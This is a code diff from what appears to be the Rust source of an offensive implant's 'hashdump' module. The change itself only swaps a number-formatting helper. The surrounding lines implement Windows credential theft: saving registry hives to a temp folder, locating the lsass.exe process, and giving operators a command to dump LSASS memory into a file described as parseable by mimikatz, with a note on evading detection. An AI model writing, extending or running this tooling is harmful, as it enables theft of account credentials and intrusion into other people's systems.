@@ -99,7 +99,7 @@ unsafe fn stream_file(rt: &Runtime, host_path: &str, chunk_name: &str) -> Vec<Re
                         let mut e = String::from("hashdump: ");
                         e.push_str(chunk_name);
                         e.push_str(": hive locked (save-hive failed rc=");
-                        push_decimal(&mut e, rc as u32);
+                        crate::fmt::push_decimal_u32(&mut e, rc as u32);
                         e.push(')');
                         return vec![Response::Err(e)];
                     }
@@ -188,7 +188,7 @@ pub fn do_hashdump(rt: Option<&'static Runtime>, method: u8) -> Response {
         other => {
             return Response::Err({
                 let mut e = String::from("hashdump: unknown method ");
-                push_decimal(&mut e, other as u32);
+                crate::fmt::push_decimal_u32(&mut e, other as u32);
                 e
             });
         }
@@ -269,9 +269,9 @@ pub fn do_hashdump_vec(rt: Option<&'static Runtime>, method: u8) -> Vec<Response
                     "hashdump lsass: dump via the kernel-tier reader (implant cannot dump \
                      LSASS — loudest IOC). LSASS pid=",
                 );
-                push_decimal(&mut m, lsass_pid as u32);
+                crate::fmt::push_decimal_u32(&mut m, lsass_pid as u32);
                 m.push_str(". On the target run: `nyx-kernel dump-lsass ");
-                push_decimal(&mut m, lsass_pid as u32);
+                crate::fmt::push_decimal_u32(&mut m, lsass_pid as u32);
                 m.push_str(
                     "` — it produces a real .dmp (mimikatz-parseable via minidump-assembler).\n",
                 );
@@ -281,30 +281,12 @@ pub fn do_hashdump_vec(rt: Option<&'static Runtime>, method: u8) -> Vec<Response
         }
         other => {
             let mut e = String::from("hashdump: unknown method ");
-            push_decimal(&mut e, other as u32);
+            crate::fmt::push_decimal_u32(&mut e, other as u32);
             vec![Response::Err(e)]
         }
     }
 }
 
-/// Append `v` in decimal to `s` (no `format!`/`to_string` under no_std).
-fn push_decimal(s: &mut String, mut v: u32) {
-    if v == 0 {
-        s.push('0');
-        return;
-    }
-    let mut tmp = [0u8; 10];
-    let mut i = tmp.len();
-    while v != 0 {
-        i -= 1;
-        tmp[i] = b'0' + (v % 10) as u8;
-        v /= 10;
-    }
-    // tmp[i..] is valid ASCII digits; push each as a char.
-    for &b in &tmp[i..] {
-        s.push(b as char);
-    }
-}
 
 /// Walk the process list via `CreateToolhelp32Snapshot` + `Process32FirstW`/
 /// `Process32NextW` and return the PID of `lsass.exe`, or `None` if not found
@@ -711,7 +693,7 @@ unsafe fn save_hive_fallback(chunk_name: &str) -> Result<String, i32> {
         alt_str.push_str("C:\\Windows\\Temp\\");
         alt_str.push_str(chunk_name);
         alt_str.push('_');
-        push_decimal(&mut alt_str, tick);
+        crate::fmt::push_decimal_u32(&mut alt_str, tick);
         alt_str.push_str(".hive");
         let mut alt_wide: Vec<u16> = Vec::with_capacity(alt_str.len() + 1);
         for c in alt_str.chars() {
